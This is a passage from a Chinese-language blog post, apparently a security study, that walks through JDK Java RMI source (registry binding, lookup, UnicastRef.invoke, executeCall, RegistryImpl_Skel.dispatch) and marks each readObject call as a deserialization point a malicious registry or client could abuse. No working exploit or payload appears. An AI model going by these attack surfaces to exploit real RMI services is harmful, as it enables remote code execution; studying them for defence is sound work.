class="variable">lref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, port);</span><br><span class="line">        setup(<span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(lref));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里又创建了一个LiveRef其实和上面创建基本一样，但是这里的port是我们传入要绑定的端口这里是1099,往下看就基本一样了，直接看创建后的lref有什么就可以</p>
<p><img src="https://luokuang1.github.io/images/rmi11.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rmi12.png" width="95%" height="80%"></p>
<p>这里也是将网络请求的东西进行了封装，ip+port,下面的又new了一个UnicastServerRef对象这里的话，其实和上面的一样，对构建的lref进行封装赋值，这里先明确一点创建的liveref就是LiveRef@854，下面就是对其进行反复的导出</p>
<p><img src="https://luokuang1.github.io/images/rmi13.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rmi14.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rmi15.png" width="95%" height="80%"></p>
<p>这里通过setup调用到UnicastServerRef的exportObject方法但是可以发现和以前不一样，这里传入的值为true，而不是false，具体的意思是是否长期对其进行存储，如果为true就是长期，否则为短期，下面就跟进去看看里面是不是也有什么变化，虽然代码是一样的，但是传入的implclass不一样了，所以实现的代码也有很多的不同,在<em>createProxy方法中</em></p>
<p><img src="https://luokuang1.github.io/images/rmi16.png" width="95%" height="80%"></p>
<p>首先是传入的类名为RegistryImpl，所以通过拼接后的名字就为RegistryImpl_stub，下面这里就会去判断是否存在该类，这里是否存在呢，答案是存在的，接下来就会创建一个RemoteStub类进行返回，这里就通过了下面的判断</p>
<p><img src="https://luokuang1.github.io/images/rmi17.png" width="95%" height="80%"></p>
<p><img src="https://luokuang1.github.io/images/rmi18.png" width="95%" height="80%"></p>
<p>下面就进入setSkeleton方法里面看看它是要干什么，其实还是很明显的，创建一个Skeleton，而Skeleton就是在服务器上的动态代理用来处理与客户端的交互</p>
<p><img src="https://luokuang1.github.io/images/rmi19.png" width="95%" height="80%"></p>
<p>这里创建Skeleton的核心也是liveRef，后面还是和创建远程对象一样封装到target里面,后面又是不断的调用exportObject最后启用网络连接</p>
<p><img src="https://luokuang1.github.io/images/rmi20.png" width="95%" height="80%"></p>
<p>最后就是绑定注册中心</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    checkAccess(<span class="string">&quot;Registry.bind&quot;</span>);</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;</span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里其实就是先判断是否已经绑定该目录，如果没有绑定就将远程对象直接put进去</p>
<p>到这里就已经是创建远程对象和创建注册中心并且进行绑定了</p>
<h3 id="客户端对注册中心"><a href="#客户端对注册中心" class="headerlink" title="客户端对注册中心"></a>客户端对注册中心</h3><p>下面就去看看客户端与注册中心的流程</p>
<p><img src="https://luokuang1.github.io/images/rmi21.png" width="95%" height="80%"></p>
<p>首先将断点设到获取注册中心</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title function_">getRegistry</span><span class="params">(String host, <span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                   RMIClientSocketFactory csf)</span></span><br><span class="line">    <span class="keyword">throws</span> RemoteException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (port &lt;= <span class="number">0</span>)</span><br><span class="line">        port = Registry.REGISTRY_PORT;</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="literal">null</span> || host.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            host = java.net.InetAddress.getLocalHost().getHostAddress();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            host = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">LiveRef</span> <span class="variable">liveRef</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">LiveRef</span>(<span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.REGISTRY_ID),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port, csf, <span class="literal">null</span>),</span><br><span class="line">                    <span class="literal">false</span>);</span><br><span class="line">    <span class="type">RemoteRef</span> <span class="variable">ref</span> <span class="operator">=</span></span><br><span class="line">        (csf == <span class="literal">null</span>) ? <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(liveRef) : <span class="keyword">new</span> <span class="title class_">UnicastRef2</span>(liveRef);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (Registry) Util.createProxy(RegistryImpl.class, ref, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里创建了一个liveRef，可以看看创建完成后里面有什么，主要是ip和端口，主要看后面又调用了Util.<em>createProxy</em></p>
<p><img src="https://luokuang1.github.io/images/rmi22.png" width="95%" height="80%"></p>
<p>这里跟进去后发现其创建了一个stub和服务端是一模一样的，所以对于客户端获取stub其实是本地进行创建，然后通过注册中心来获取对应的参数和值，下面主要看stub参数和值是然后从注册中心获取</p>
<p><img src="https://luokuang1.github.io/images/rmi23.png" width="95%" height="80%"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">RemoteCall</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">            var3.writeObject(var1);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var18);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.ref.invoke(var2);</span><br><span class="line">        Remote var23;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">            var23 = (Remote)var6.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var16);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> var23;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException var19) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var19;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException var20) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var20;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NotBoundException var21) &#123;</span><br><span class="line">        <span class="keyword">throw</span> var21;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var22) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var22);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面就只能进行手动分析了，这里还是有一些关键点的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectOutput</span> <span class="variable">var3</span> <span class="operator">=</span> var2.getOutputStream();</span><br><span class="line">var3.writeObject(var1);</span><br></pre></td></tr></table></figure>
<p>这里它将我们lookup传入的字符串写入了字节流，这里就可以知道客户端传输给服务端lookup的字符串会进行一次反序列化，所以这里就有一个反序列化点，接下来就会调用一个ref.invoke方法,这里跟进去看看里面有什么，这里会调用到UnicastRef的invoke方法，下面我们可以去将断点下到着来看看接下来做了什么</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall call)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">        call.executeCall();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, e);</span><br><span class="line">        free(call, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error e) &#123;</span><br><span class="line">        clientRefLog.log(Log.BRIEF, <span class="string">&quot;error: &quot;</span>, e);</span><br><span class="line">        free(call, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, e);</span><br><span class="line">        free(call, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, e);</span><br><span class="line">        free(call, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://luokuang1.github.io/images/rmi24.png" width="95%" height="80%"></p>
<p>在里面调用了一个excuteCall方法这里需要注意一下，基本上所有的客户端调用网络请求都是通过excuteCall方法进行的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">byte</span> returnType;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read result header</span></span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">ackHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (out != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler = out.getDGCAckHandler();</span><br><span class="line">        &#125;</span><br><span class="line">        releaseOutputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">rd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">op</span> <span class="operator">=</span> rd.readByte();</span><br><span class="line">        <span class="keyword">if</span> (op != TransportConstants.Return) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;transport return code invalid: &quot;</span> + op);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Transport return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        getInputStream();</span><br><span class="line">        returnType = in.readByte();</span><br><span class="line">        in.readID();        <span class="comment">// id for DGC acknowledgement</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnmarshalException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return header&quot;</span>,</span><br><span class="line">                                     e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (ackHandler != <span class="literal">null</span>) &#123;</span><br><span class="line">            ackHandler.release();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read return value</span></span><br><span class="line">    <span class="keyword">switch</span> (returnType) &#123;</span><br><span class="line">    <span class="keyword">case</span> TransportConstants.NormalReturn:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// An exception should have been received,</span></span><br><span class="line">        <span class="comment">// if so throw it, else flag error</span></span><br><span class="line">        <span class="keyword">if</span> (ex <span class="keyword">instanceof</span> Exception) &#123;</span><br><span class="line">            exceptionReceivedFromServer((Exception) ex);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Exception is thrown before fallthrough can occur</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            Transport.transportLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;return code invalid: &quot;</span> + returnType);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里可以看到在处理一种异常时里面调用了readObject方法，这里的初衷应该是为了获取异常的详细情况，但是如果从注册中心搞一个恶意的进行传输就可能导致客户端调用恶意的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> TransportConstants.ExceptionalReturn:</span><br><span class="line">        Object ex;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ex = in.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Error unmarshaling return&quot;</span>, e);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>下面调用完invoke方法后就通过反序列化来获取对应的远程对象代理，所以在客户端获取远程对象代理是通过反序列化来实现的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">    var23 = (Remote)var6.readObject();</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h3 id="客户端调用服务端"><a href="#客户端调用服务端" class="headerlink" title="客户端调用服务端"></a>客户端调用服务端</h3><p><img src="https://luokuang1.github.io/images/rmi25.png" width="95%" height="80%"></p>
<p>通过客户端的动态代理stub来调用服务端的方法，下面就可以看看具体是怎么实现，首先可以想到在调用动态代理的方法时会先调用其invoke方法，这里也是一样，先看看它的invoke方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Throwable</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Proxy.isProxyClass(proxy.getClass())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;not a proxy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Proxy.getInvocationHandler(proxy) != <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;handler mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeObjectMethod(proxy, method, args);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;finalize&quot;</span>.equals(method.getName()) &amp;&amp; method.getParameterCount() == <span class="number">0</span> &amp;&amp;</span><br><span class="line">        !allowFinalizeInvocation) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// ignore</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> invokeRemoteMethod(proxy, method, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的invoke方法里面主要看invokeRemoteMethod里面有什么，这里里面调用了UnicastRef的invoke,但是不是以前的invoke方法，而是方法重写，看看里面有什么</p>
<p><img src="https://luokuang1.github.io/images/rmi26.png" width="95%" height="80%"></p>
<p>下面就可以看看invoke里面实现了什么,这里主要是三个点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Remote obj,</span></span><br><span class="line"><span class="params">                     Method method,</span></span><br><span class="line"><span class="params">                     Object[] params,</span></span><br><span class="line"><span class="params">                     <span class="type">long</span> opnum)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        clientRefLog.log(Log.VERBOSE, <span class="string">&quot;method: &quot;</span> + method);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (clientCallLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        logClientCall(obj, method);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> ref.getChannel().newConnection();</span><br><span class="line">    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">reuse</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">alreadyFreed</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;opnum = &quot;</span> + opnum);</span><br><span class="line">        &#125;</span><br><span class="line">        call = <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn, ref.getObjID(), -<span class="number">1</span>, opnum);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getOutputStream();</span><br><span class="line">            marshalCustomCallData(out);</span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                marshalValue(types[i], params[i], out);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;IOException marshalling arguments: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        call.executeCall();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">            <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line">            alreadyFreed = <span class="literal">true</span>;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = true)&quot;</span>);</span><br><span class="line">            ref.getChannel().free(conn, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> returnValue;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF,</span><br><span class="line">                             <span class="string">&quot;IOException unmarshalling return: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF,</span><br><span class="line">                <span class="string">&quot;ClassNotFoundException unmarshalling return: &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                call.done();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                reuse = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((call == <span class="literal">null</span>) ||</span><br><span class="line">            (((StreamRemoteCall) call).getServerException() != e))</span><br><span class="line">        &#123;</span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">        reuse = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Error e) &#123;</span><br><span class="line">        reuse = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!alreadyFreed) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clientRefLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = &quot;</span> +</span><br><span class="line">                                       reuse + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.getChannel().free(conn, reuse);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先这个方法里面先调用了marshalValue方法，通过跟进就发现这里最后调用了writeObject()方法，将我们传入的函数的参数通过序列化写入字节流，这里也说明在服务器端里面调用了readObject()方法来反序列化获取字节流，</p>
<p><img src="https://luokuang1.github.io/images/rmi27.png" width="95%" height="80%"></p>
<p>下面关键是看到它还是调用了executeCall(),对于客户端来说，处理网络请求都是需要通过executeCall方法，这里就也会有反序列化的点</p>
<p>最后一个点是根据调用的方法是否存在返回值来决定的，unmarshalValue方法</p>
<p><img src="https://luokuang1.github.io/images/rmi28.png" width="95%" height="80%"></p>
<p>里面是最后通过反序列化获取了函数的返回值</p>
<p><img src="https://luokuang1.github.io/images/rmi29.png" width="95%" height="80%"></p>
<p>这样客户端就基本结束了，下面就分析注册中心和服务端是怎么处理的</p>
<p>首先是注册中心最后会调用到RegistryImpl_Skel的dispatch方法，这里将对应的lookup或者rebind等方法的传入的参数通过反序列来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">if</span> (var4 != <span class="number">4905912898345647071L</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">RegistryImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (RegistryImpl)var1;</span><br><span class="line">        String var7;</span><br><span class="line">        Remote var8;</span><br><span class="line">        ObjectInput var10;</span><br><span class="line">        ObjectInput var11;</span><br><span class="line">        <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var94) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var94);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var95) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var95);</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var6.bind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var93) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var93);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                var2.releaseInputStream();</span><br><span class="line">                String[] var97 = var6.list();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">ObjectOutput</span> <span class="variable">var98</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    var98.writeObject(var97);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var92) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var92);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException var89) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var89);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException var90) 